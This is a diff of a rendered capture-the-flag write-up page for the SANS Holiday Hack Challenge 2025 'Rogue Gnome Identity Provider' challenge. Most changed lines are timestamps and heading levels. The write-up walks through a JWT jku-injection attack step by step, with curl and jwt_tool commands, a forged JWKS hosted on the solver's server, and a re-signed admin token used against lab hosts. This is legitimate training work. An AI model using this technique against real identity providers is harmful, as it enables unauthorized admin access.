@@ -39,26 +39,26 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
     <meta itemprop="wordCount" content="1430">
     <title>Rogue Gnome Identity Provider :: SANS Holiday Hack Challenge 2025</title>
     <link href="/act2/rogue-gnome-identity-provider/index.xml" rel="alternate" type="application/rss+xml" title="Rogue Gnome Identity Provider :: SANS Holiday Hack Challenge 2025">
-    <link href="/css/auto-complete/auto-complete.min.css?1764415420" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1764415420" defer></script>
-    <script src="/js/search-lunr.js?1764415420" defer></script>
-    <script src="/js/search.js?1764415420" defer></script>
+    <link href="/css/auto-complete/auto-complete.min.css?1764415674" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1764415674" defer></script>
+    <script src="/js/search-lunr.js?1764415674" defer></script>
+    <script src="/js/search.js?1764415674" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1764415420";
+      window.relearn.index_js_url="/searchindex.en.js?1764415674";
     </script>
-    <script src="/js/lunr/lunr.min.js?1764415420" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1764415420" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1764415420" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1764415420" defer></script>
+    <script src="/js/lunr/lunr.min.js?1764415674" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1764415674" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1764415674" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1764415674" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1764415420" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1764415420" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1764415420" rel="stylesheet">
-    <link href="/css/theme.css?1764415420" rel="stylesheet">
-    <link href="/css/format-html.css?1764415420" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1764415674" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1764415674" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1764415674" rel="stylesheet">
+    <link href="/css/theme.css?1764415674" rel="stylesheet">
+    <link href="/css/format-html.css?1764415674" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -131,21 +131,10 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
   <ul>
     <li><a href="#objective">Objective</a></li>
     <li><a href="#paul-beckett-mission-statement">Paul Beckett mission statement</a></li>
-    <li><a href="#rogue-gnome-terminal">Rogue Gnome Terminal</a></li>
-    <li><a href="#validating-the-authentication-flow">Validating the authentication flow</a>
+    <li><a href="#rogue-gnome-terminal">Rogue Gnome Terminal</a>
       <ul>
-        <li><a href="#request-the-idp-login-page">Request the IDP login page</a></li>
-        <li><a href="#obtaining-token">Obtaining token</a></li>
-        <li><a href="#authenticating-to-gnome-48371atnascorp">Authenticating to gnome-48371.atnascorp</a></li>
-        <li><a href="#inspecting-jwt">Inspecting JWT</a></li>
-      </ul>
-    </li>
-    <li><a href="#solution">Solution</a>
-      <ul>
-        <li><a href="#obtain-jwt-token">Obtain JWT Token</a></li>
-        <li><a href="#decoding-token">Decoding token</a></li>
-        <li><a href="#inspecting-jwksjson">Inspecting jwks.json</a></li>
-        <li><a href="#attacking-jwt">Attacking JWT</a></li>
+        <li><a href="#validating-the-authentication-flow">Validating the authentication flow</a></li>
+        <li><a href="#solution">Solution</a></li>
       </ul>
     </li>
     <li><a href="#paul-beckett-mission-debrief">Paul Beckett mission debrief</a></li>
@@ -185,8 +174,8 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
 
 <h1 id="rogue-gnome-identity-provider">Rogue Gnome Identity Provider</h1>
 
-<p><a href="#R-image-6acaf6215e256694db339ec976e44068" class="lightbox-link"><img alt="Paul Beckett" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/paulbeckett-avatar.gif" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-6acaf6215e256694db339ec976e44068"><img alt="Paul Beckett" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/paulbeckett-avatar.gif"></a></p>
+<p><a href="#R-image-267a370b361cd55c05fcdd2f10d105c4" class="lightbox-link"><img alt="Paul Beckett" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/paulbeckett-avatar.gif" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-267a370b361cd55c05fcdd2f10d105c4"><img alt="Paul Beckett" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/paulbeckett-avatar.gif"></a></p>
 <h2 id="objective">Objective</h2>
 <p>Difficulty: 2/5</p>
 <p>Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?</p>
@@ -209,11 +198,11 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
 <li><em>Address</em>: <code>gnome-48371.atnascorp</code></li>
 </ul>
 <p>Logging into the terminal and reading the welcome text we are presented with some helpful hints:</p>
-<p><a href="#R-image-c7ba4efafbecd32885645ac88b5b377e" class="lightbox-link"><img alt="Welcome" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-1.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-c7ba4efafbecd32885645ac88b5b377e"><img alt="Welcome" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-1.png"></a></p>
+<p><a href="#R-image-b6449185923782982f0ecd3651d1ff74" class="lightbox-link"><img alt="Welcome" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-1.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b6449185923782982f0ecd3651d1ff74"><img alt="Welcome" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-1.png"></a></p>
 <p>The welcome text mentions notes in file <code>~/notes</code> :</p>
-<p><a href="#R-image-8b9a3ddcce6c67227717c81467faafcf" class="lightbox-link"><img alt="Notes" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-2.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-8b9a3ddcce6c67227717c81467faafcf"><img alt="Notes" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-2.png"></a></p>
+<p><a href="#R-image-f63673bab62e7e7a12a61e4af5e269f4" class="lightbox-link"><img alt="Notes" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-2.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-f63673bab62e7e7a12a61e4af5e269f4"><img alt="Notes" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-2.png"></a></p>
 <p>For clarity, these are the notes:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span># Sites
 </span></span><span style="display:flex;"><span>
@@ -253,11 +242,11 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">## Analyze the JWT
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>jwt_tool.py &lt;insert-JWT&gt;</span></span></code></pre></div>
-<h2 id="validating-the-authentication-flow">Validating the authentication flow</h2>
-<h3 id="request-the-idp-login-page">Request the IDP login page</h3>
+<h3 id="validating-the-authentication-flow">Validating the authentication flow</h3>
+<h4 id="request-the-idp-login-page">Request the IDP login page</h4>
 <p>Making sure we can reach the ODP login page:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://idp.atnascorp/?return_uri<span style="color:#f92672">=</span>http%3A%2F%2Fgnome-48371.atnascorp%2Fauth</span></span></code></pre></div>
-<h3 id="obtaining-token">Obtaining token</h3>
+<h4 id="obtaining-token">Obtaining token</h4>
 <p>Logging in using the credentials provided to retrieve JWT token:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST --data-binary <span style="color:#e6db74">$&#39;username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth&#39;</span> http://idp.atnascorp/login</span></span></code></pre></div>
 <p>Sure, it works. We got a JWT token:</p>
@@ -266,7 +255,7 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">title</span>&gt;Redirecting...&lt;/<span style="color:#f92672">title</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt;Redirecting...&lt;/<span style="color:#f92672">h1</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;You should be redirected automatically to the target URL: &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQwNTYwMSwiZXhwIjoxNzY0NDEyODAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.jL0eAsQOkMuLYAKPRzLK_Y50EY2JdtOYjgwQlJrTtLgJDQhHyZ9U5ReYrYgL4uzO0SeAVV7t_at3tS9y282uwaZ1OuPXGc_SzG2WTh-15TFnG-yJ-bjTUaNayHlyYRSHn1S18taA9kV12Gc9pBnBZJmxDEB1hhfXa6EibHavmVs5FU0uJK2p4h7GEP3tqqJ315tWmyf2ZQJnp-IAHHOp1aoSSL4TlWnVtoUqWtmZxeDegdlXPTaAbhu4xW7j0iHkJt1RRw3JeegpmyS2i4FyDdApL8Run3Po_HDkcuYOcquX_3GyTi_FdGaJezxj3s8QGaZySszOt8juUfcOptx40w&#34;</span>&gt;http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQwNTYwMSwiZXhwIjoxNzY0NDEyODAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.jL0eAsQOkMuLYAKPRzLK_Y50EY2JdtOYjgwQlJrTtLgJDQhHyZ9U5ReYrYgL4uzO0SeAVV7t_at3tS9y282uwaZ1OuPXGc_SzG2WTh-15TFnG-yJ-bjTUaNayHlyYRSHn1S18taA9kV12Gc9pBnBZJmxDEB1hhfXa6EibHavmVs5FU0uJK2p4h7GEP3tqqJ315tWmyf2ZQJnp-IAHHOp1aoSSL4TlWnVtoUqWtmZxeDegdlXPTaAbhu4xW7j0iHkJt1RRw3JeegpmyS2i4FyDdApL8Run3Po_HDkcuYOcquX_3GyTi_FdGaJezxj3s8QGaZySszOt8juUfcOptx40w&lt;/<span style="color:#f92672">a</span>&gt;. If not, click the link.</span></span></code></pre></div>
-<h3 id="authenticating-to-gnome-48371atnascorp">Authenticating to gnome-48371.atnascorp</h3>
+<h4 id="authenticating-to-gnome-48371atnascorp">Authenticating to gnome-48371.atnascorp</h4>
 <p>With token we just obtained, we can now go ahead and authentice to `gnome-48371.atnascorp``:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>curl -v -L http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQwNTYwMSwiZXhwIjoxNzY0NDEyODAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.jL0eAsQOkMuLYAKPRzLK_Y50EY2JdtOYjgwQlJrTtLgJDQhHyZ9U5ReYrYgL4uzO0SeAVV7t_at3tS9y282uwaZ1OuPXGc_SzG2WTh-15TFnG-yJ-bjTUaNayHlyYRSHn1S18taA9kV12Gc9pBnBZJmxDEB1hhfXa6EibHavmVs5FU0uJK2p4h7GEP3tqqJ315tWmyf2ZQJnp-IAHHOp1aoSSL4TlWnVtoUqWtmZxeDegdlXPTaAbhu4xW7j0iHkJt1RRw3JeegpmyS2i4FyDdApL8Run3Po_HDkcuYOcquX_3GyTi_FdGaJezxj3s8QGaZySszOt8juUfcOptx40w</code></pre></div>
 <p>Sure enough, it works - and we got a session cookie as well:</p>
@@ -310,14 +299,14 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;</span></span></code></pre></div>
 <p>By this we I have now validated that the command line sequence indeed works and leads to successful authentication. However, the welcome screen states that &lsquo;Diagnostic access&rsquo; is only availabel to admins. Since we are dealing with JWT here, it is time to dissect it to see if we can utilize it to get admin access.</p>
-<h3 id="inspecting-jwt">Inspecting JWT</h3>
+<h4 id="inspecting-jwt">Inspecting JWT</h4>
 <p>I am fully aware that ´notes´ file hinted at using the <code>jwt_tool</code> - but for inspecting JWT&rsquo;s I defaulted to using my goto tool <a href="https://www.jwt.io" rel="external">JWT.io</a>:</p>
-<p><a href="#R-image-99280b6549ad6187ddefa031298a235e" class="lightbox-link"><img alt="Decoding" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-3.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-99280b6549ad6187ddefa031298a235e"><img alt="Decoding" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-3.png"></a></p>
+<p><a href="#R-image-80327d56ad4bbd2f4b522d1513425e5b" class="lightbox-link"><img alt="Decoding" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-3.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-80327d56ad4bbd2f4b522d1513425e5b"><img alt="Decoding" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-3.png"></a></p>
 <p>Most likely we can just change <code>admin</code> key to <code>true</code> and hope for the best! However - things are seldom so easy - as we will se in the next section.</p>
-<h2 id="solution">Solution</h2>
+<h3 id="solution">Solution</h3>
 <p>For solving this terminal I decided to start from scratch, thus terminating and starting a new terminal.</p>
-<h3 id="obtain-jwt-token">Obtain JWT Token</h3>
+<h4 id="obtain-jwt-token">Obtain JWT Token</h4>
 <p>Just like earlier, I started getting a JWT Token:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST --data-binary <span style="color:#e6db74">$&#39;username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth&#39;</span> http://idp.atnascorp/login</span></span></code></pre></div>
 <p>The token:</p>
@@ -326,11 +315,11 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">title</span>&gt;Redirecting...&lt;/<span style="color:#f92672">title</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt;Redirecting...&lt;/<span style="color:#f92672">h1</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;You should be redirected automatically to the target URL: &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMTM4MSwiZXhwIjoxNzY0NDE4NTgxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.PZ7wPV0dM4W35hakhc2elX6NaSXKCRflU0C4vWwOd1p9qaynIafm-AP4zteoIOciXB82aFPmbNYolG6Od13y4nn9NT-nypRtj2NjFsMf53OFcGRd_MjK5rFhtClDRHk0mtTrPNhsdAdJnv2IXj-g6KkVrEmU8A1qRPvrHNqabzRP6gfuqz__hWv71CKHnI1IzOJ6RNJnzRNirir2xVsUqXSKPw4T1K3vmvsVUBM3o1EZjZm2OTIh3wb7t1XFVkg62O3BBEoypIyziE9-hZeHqO9YgYfjtrB-o2qNGSk64tBJwxWCEySoT9FjvFasoUKIGneVP6pkHSkhMFKCvaxXyQ&#34;</span>&gt;http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMTM4MSwiZXhwIjoxNzY0NDE4NTgxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.PZ7wPV0dM4W35hakhc2elX6NaSXKCRflU0C4vWwOd1p9qaynIafm-AP4zteoIOciXB82aFPmbNYolG6Od13y4nn9NT-nypRtj2NjFsMf53OFcGRd_MjK5rFhtClDRHk0mtTrPNhsdAdJnv2IXj-g6KkVrEmU8A1qRPvrHNqabzRP6gfuqz__hWv71CKHnI1IzOJ6RNJnzRNirir2xVsUqXSKPw4T1K3vmvsVUBM3o1EZjZm2OTIh3wb7t1XFVkg62O3BBEoypIyziE9-hZeHqO9YgYfjtrB-o2qNGSk64tBJwxWCEySoT9FjvFasoUKIGneVP6pkHSkhMFKCvaxXyQ&lt;/<span style="color:#f92672">a</span>&gt;. If not, click the link</span></span></code></pre></div>
-<h3 id="decoding-token">Decoding token</h3>
+<h4 id="decoding-token">Decoding token</h4>
 <p>This time around decoding the token, I used the <code>jwt_tool</code> utility. This mostly for getting the hang of this tool:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jwt_tool.py <span style="color:#e6db74">&#39;eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMTM4MSwiZXhwIjoxNzY0NDE4NTgxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.PZ7wPV0dM4W35hakhc2elX6NaSXKCRflU0C4vWwOd1p9qaynIafm-AP4zteoIOciXB82aFPmbNYolG6Od13y4nn9NT-nypRtj2NjFsMf53OFcGRd_MjK5rFhtClDRHk0mtTrPNhsdAdJnv2IXj-g6KkVrEmU8A1qRPvrHNqabzRP6gfuqz__hWv71CKHnI1IzOJ6RNJnzRNirir2xVsUqXSKPw4T1K3vmvsVUBM3o1EZjZm2OTIh3wb7t1XFVkg62O3BBEoypIyziE9-hZeHqO9YgYfjtrB-o2qNGSk64tBJwxWCEySoT9FjvFasoUKIGneVP6pkHSkhMFKCvaxXyQ&#39;</span></span></span></code></pre></div>
-<p><a href="#R-image-4ffa70be0aff966124084a89be5fbe40" class="lightbox-link"><img alt="Decoding token" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-4.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-4ffa70be0aff966124084a89be5fbe40"><img alt="Decoding token" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-4.png"></a></p>
+<p><a href="#R-image-5463789d60fd4a07fb24686f9bb64c66" class="lightbox-link"><img alt="Decoding token" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-4.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-5463789d60fd4a07fb24686f9bb64c66"><img alt="Decoding token" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-4.png"></a></p>
 <p>There are a few things we must be aware of here:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>[+] alg = &#34;RS256&#34;
 [+] jku = &#34;http://idp.atnascorp/.well-known/jwks.json&#34;
@@ -363,7 +352,7 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
       </tr>
   </tbody>
 </table>
-<h3 id="inspecting-jwksjson">Inspecting jwks.json</h3>
+<h4 id="inspecting-jwksjson">Inspecting jwks.json</h4>
 <p>Obtaining the <code>jwks.json</code> file referenced in the JSON Web Key URL (jku) part:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://idp.atnascorp/.well-known/jwks.json</span></span></code></pre></div>
 <p>As we can see it gives some interesting information:</p>
@@ -409,7 +398,7 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
       </tr>
   </tbody>
 </table>
-<h3 id="attacking-jwt">Attacking JWT</h3>
+<h4 id="attacking-jwt">Attacking JWT</h4>
 <p>From looking at the <code>http://idp.atnascorp/.well-known/jwks.json</code> file I see that the server is using this to validate the tokens. My plan is to fool the server to reach out to my variant, and see if I can fool my way in!</p>
 <p>From the <code>notes</code> file I can see we are hosting <code>CyberChef</code> from the local <code>www</code> folder. I can abuse that to host my poisonous jwks file from that folder.</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span><span style="color:#75715e">## My CyberChef website:
@@ -443,8 +432,8 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
 <p>Creating a new JWT. Here I changed <code>admin</code> to <code>true</code>, and instruct the server to use <code>http://paulweb.neighborhood/jwttool_custom_jwks.json</code> as <code>jku</code>:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jwt_tool.py <span style="color:#e6db74">&#39;eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMzUzMywiZXhwIjoxNzY0NDIwNzMzLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.Sz5xSo15RlbxT7VcP2qYUUzZBZQfqkFZ3DiIusl0Y16NMcxOHCpY5ZPedxDJeHy8lnbzG-1KncDUL9qBIRD4dUOsT_R58Oy29ynoLLiwBQ5KLK-oq4HLCpWTIQ3PBk7w2SBWqJMAcdPRNCxjygUGoAnpTcjlaHk4wtRLp2X0hGLJP7sXIv1F7cQZF4Bg780ICAaPvP_jcRFF1wxzA2sMMPImrRIoA7Y53Jzk4WrMaSVJjCPXR4OxrdzPoCLzmB7Z49pSzVYv6__6vZg2WzwDxWnMTKRijK7bgJSF65NoYNfChlLd5m00t6L5E9fRIVRGIaVtQ7fydQkwSe42pRib-g&#39;</span> -I -pc admin -pv true -X s -ju http://paulweb.neighborhood/jwttool_custom_jwks.json</span></span></code></pre></div>
 <p>The same as above, but with fancy output:</p>
-<p><a href="#R-image-792c6e9d0a9ffef25ce68f0787096e5a" class="lightbox-link"><img alt="Creating a new token" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-5.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-792c6e9d0a9ffef25ce68f0787096e5a"><img alt="Creating a new token" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-5.png"></a></p>
+<p><a href="#R-image-22d7fc50650e94b5277bab7044856cf4" class="lightbox-link"><img alt="Creating a new token" class="lazy lightbox figure-image" loading="lazy" src="/images/act2/act2-rogue-gnome-5.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-22d7fc50650e94b5277bab7044856cf4"><img alt="Creating a new token" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act2/act2-rogue-gnome-5.png"></a></p>
 <p>Now authenticating as admin:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -v http://gnome-48371.atnascorp/auth?token<span style="color:#f92672">=</span>eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd3R0b29sX2N1c3RvbV9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMzUzMywiZXhwIjoxNzY0NDIwNzMzLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.Dx4hBjLLBnLZZNr_kP3-5BzY4K-eN8WfhTgwGq6zOprrxSNxjS-FkNLwlAAwYdt1hxNghAh-0FXRtt-XoRha9yog4Z0z-mHivLJKymBsCCpq9jacCp6NE3C4Aom6ZQFBYoyW9PZZ-e-3r75fCpR555ydOYWlRqfYCKIwet7f1lCjshr8uI6yDNh8vp98PvNz2ZJIXy0mGY6TwrDR-sUF66q0g6FWOhM2NvUq02R5OiLWjpiUuPSH8-O9A6AYRoMyxFUJnWUXwGSCilWS9LL7ScBaasMG8QN30mFZHYHcJsuRLOfIUUZorY4TZRtzIMBYbiVlGG2bwuLNJgf7bW4dnA</span></span></code></pre></div>
 <p>Success. I got a session cookie! Logging in as admin using this session cookie:</p>
@@ -568,8 +557,8 @@ I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan 
 <div id="R-footer"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/clipboard/clipboard.min.js?1764415420" defer></script>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1764415420" defer></script>
-    <script src="/js/theme.js?1764415420" defer></script>
+    <script src="/js/clipboard/clipboard.min.js?1764415674" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1764415674" defer></script>
+    <script src="/js/theme.js?1764415674" defer></script>
   </body>
 </html>
